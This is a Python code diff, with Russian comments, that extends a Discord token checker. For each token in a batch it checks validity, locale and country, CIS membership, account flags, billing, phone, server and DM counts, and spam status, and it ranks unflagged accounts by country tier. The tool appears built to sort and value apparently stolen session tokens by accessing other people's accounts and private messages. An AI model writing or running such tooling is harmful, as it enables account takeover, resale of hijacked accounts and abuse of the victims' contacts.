@@ -275,40 +275,73 @@ class DiscordAdvancedChecker:
         return None
     
     def check_single_token(self, token: str) -> Dict:
-        """Проверяет один токен - только валидность и проспам"""
+        """Проверяет один токен полностью"""
         result = {
             'token': token,
             'valid': False,
             'user_id': None,
             'username': None,
+            'locale': None,
+            'is_cis': False,
             'spam_status': None,
+            'flags': {},
+            'has_billing': False,
+            'has_phone': False,
+            'total_chats': 0,
+            'excluded_chats': 0,
+            'tier': None,
+            'check_error': None,  # Ошибка при доп проверках (не влияет на valid)
         }
         
         # Проверка валидности - ЕДИНСТВЕННАЯ проверка которая определяет valid/invalid
         is_valid, user_data = self.check_token_validity(token)
         if not is_valid:
+            result['check_error'] = 'Token invalid'
             return result
         
         # Токен валиден
         result['valid'] = True
         result['user_id'] = user_data.get('id')
         result['username'] = user_data.get('username')
+        result['locale'] = user_data.get('locale', '').lower()
         
-        # Проверяем только проспам
+        # Все дальнейшие проверки - если упадут, токен остается valid
         try:
-            # Получаем DM каналы
+            # Получаем реальную страну несколькими методами
+            country_code = self.get_user_country(token, user_data)
+            
+            # СНГ проверка
+            result['is_cis'] = country_code in self.CIS if country_code else False
+            
+            # Флаги
+            result['flags'] = self.get_user_flags(user_data)
+            
+            # Биллинг и телефон
+            result['has_phone'] = user_data.get('phone') is not None
+            result['has_billing'] = user_data.get('premium_type') is not None or user_data.get('premium') is not None
+            
+            # Получаем сервера и DM
+            guilds = self.get_user_guilds(token)
             dm_channels = self.get_dm_channels(token)
             
             # Фильтруем DM
             valid_dms = [dm for dm in dm_channels if self._is_valid_dm(dm)]
+            excluded_dms = len(dm_channels) - len(valid_dms)
+            
+            result['total_chats'] = len(guilds) + len(valid_dms)
+            result['excluded_chats'] = excluded_dms
             
             # Проспам - проверяем последние сообщения на спам
             result['spam_status'] = self.check_spam_by_bot_method(token, valid_dms)
+            
+            # Tier (только для непроспама) - используем country_code
+            if result['spam_status'] == 'non_spam':
+                result['tier'] = self.get_country_tier(country_code)
         
         except Exception as e:
-            # Ошибка в проверке проспама - токен остается VALID
-            logger.warning(f"⚠️ Ошибка проверки проспама для {result['username']}: {e}")
-            result['spam_status'] = 'error'
+            # Ошибка в доп проверках - токен остается VALID, но помечаем ошибку
+            result['check_error'] = f'Error during additional checks: {str(e)}'
+            logger.warning(f"⚠️ Ошибка доп проверок для {result['username']}: {e}")
         
         return result
     
@@ -370,7 +403,7 @@ class DiscordAdvancedChecker:
         }
     
     def _calculate_statistics(self, results: List[Dict], line_dups: int, acc_dups: int, elapsed: float) -> Dict:
-        """Вычисляет статистику - только валидность и проспам"""
+        """Вычисляет статистику"""
         valid_results = [r for r in results if r['valid']]
         
         # Базовая статистика
@@ -378,11 +411,36 @@ class DiscordAdvancedChecker:
         valid_count = len(valid_results)
         invalid_count = total - valid_count
         
+        # Токены с ошибками доп проверок (valid, но check_error не None)
+        check_errors_count = sum(1 for r in valid_results if r.get('check_error'))
+        
+        cis_count = sum(1 for r in valid_results if r['is_cis'])
+        
         # Проспам статистика
         spam_by_bot = sum(1 for r in valid_results if r['spam_status'] == 'spam')
         non_spam_by_bot = sum(1 for r in valid_results if r['spam_status'] == 'non_spam')
         empty = sum(1 for r in valid_results if r['spam_status'] == 'empty')
-        errors = sum(1 for r in valid_results if r['spam_status'] == 'error')
+        
+        # Флаги
+        locked = sum(1 for r in valid_results if r['flags'].get('locked'))
+        spammer = sum(1 for r in valid_results if r['flags'].get('spammer'))
+        quarantine = sum(1 for r in valid_results if r['flags'].get('quarantine'))
+        limited = sum(1 for r in valid_results if r['flags'].get('limited'))
+        
+        # Биллинг и телефон
+        has_billing = sum(1 for r in valid_results if r['has_billing'])
+        has_phone = sum(1 for r in valid_results if r['has_phone'])
+        no_phone = sum(1 for r in valid_results if not r['has_phone'])
+        
+        # Tier статистика (только для непроспама)
+        non_spam_results = [r for r in valid_results if r['spam_status'] == 'non_spam']
+        tier1 = sum(1 for r in non_spam_results if r['tier'] == 'tier1')
+        tier2 = sum(1 for r in non_spam_results if r['tier'] == 'tier2')
+        tier3 = sum(1 for r in non_spam_results if r['tier'] == 'tier3')
+        
+        # Чаты
+        total_chats = sum(r['total_chats'] for r in valid_results)
+        excluded_chats = sum(r['excluded_chats'] for r in valid_results)
         
         return {
             'total': total,
@@ -390,11 +448,32 @@ class DiscordAdvancedChecker:
             'account_duplicates': acc_dups,
             'valid': valid_count,
             'invalid': invalid_count,
+            'check_errors': check_errors_count,  # Токены с ошибками доп проверок
+            'cis': cis_count,
             'spam': {
                 'by_bot': spam_by_bot,
                 'non_spam_by_bot': non_spam_by_bot,
                 'empty': empty,
-                'errors': errors,
+            },
+            'flags': {
+                'locked': locked,
+                'spammer': spammer,
+                'quarantine': quarantine,
+                'limited': limited,
+            },
+            'billing': {
+                'has_billing': has_billing,
+                'has_phone': has_phone,
+                'no_phone': no_phone,
+            },
+            'geo': {
+                'tier1': tier1,
+                'tier2': tier2,
+                'tier3': tier3,
+            },
+            'chats': {
+                'total': total_chats,
+                'excluded': excluded_chats,
             },
             'time': elapsed,
         }
